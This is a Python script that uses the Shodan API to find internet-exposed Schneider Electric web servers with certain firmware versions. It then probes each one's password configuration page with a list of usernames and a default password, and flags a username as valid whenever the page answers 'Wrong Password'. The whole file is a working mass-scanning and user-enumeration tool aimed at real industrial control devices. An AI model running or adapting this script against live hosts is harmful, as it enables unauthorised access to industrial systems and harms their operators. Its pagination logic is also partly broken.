import shodan
import requests
from termcolor import colored
from requests.auth import HTTPBasicAuth
import sys

'''
Server: Schneider-WEB/V2.1.3
Server: Schneider-WEB/V2.2.0
Server: Schneider-WEB/V2.0.11
Server: Schneider-WEB/V2.2.1
Server: Schneider-WEB/V2.5.0
Server: Schneider-WEB/V1.0.4 port 83
'''
SHODAN_API_KEY = "insert_your_shodan_api_key_here"
api = shodan.Shodan(SHODAN_API_KEY)
lista = []
resultados = []
payload = '/secure/embedded/http_passwd_config.htm?Language=English'
headers = {'User-Agent': 'Mozilla'}
search_term = "Server: Schneider-WEB"

def enumerate(lista):
    for i in lista:
        print colored('[*]', 'blue') + ' Enumerating valid user on ' + i
        try:
            file = open("users.txt", "r")
        except Exception as e:
            print colored('[-] Error, make sure that the users.txt file is in the same folder.', 'red')
            sys.exit()

        for line in file:
            try:
                line = line.strip()
                r = requests.get(i + payload, headers, auth=(line, 'web'))
                respuesta = r.text
                #print respuesta
                if respuesta.find('Wrong Password') != -1:
                    resultados.append(str(i) + '\t' + line)
                    break
            except:
                print colored('[-]', 'red') + 'Can\'t resolve' + i



results = api.search(search_term)
pages = results['total']/100
#print 'Paginas en total ' + str(pages)
raw_input()
if results['total']%100 > 0:
            pages += 1

            for n in range(1, pages+1):
                if n > 1:
                    results = api.search(search_term, page=n)

                print 'pagina' + str(n)

                for result in results['matches']:
                    data = result['data']
                    print colored('[?]', 'yellow') +' Checking ' + str(result['ip_str'])
                    if str(data).find('V2.1.3') != -1 or str(data).find('V2.2.0') != -1 or str(data).find('V2.0.11') != -1 or str(data).find('V2.2.1') != -1 or str(data).find('V2.5.0') != -1 :
                        target = str('http://' + result['ip_str'] + ':' + str(result['port']))
                        lista.append(target)
                        print colored('[+] ', 'green') + target + ' added to target list'

print colored('[*]', 'blue') + ' Starting user enumeration on ' + str(len(lista)) + ' targets'
enumerate(lista)

print colored('[+]', 'green') + ' Found valid user on ' + str(len(resultados)) + ' targets ' + colored(str((len(resultados)*100)/len(lista)), 'green') + '%'
for i in resultados:
    print i

print colored('[+]', 'green') + ' Done.'
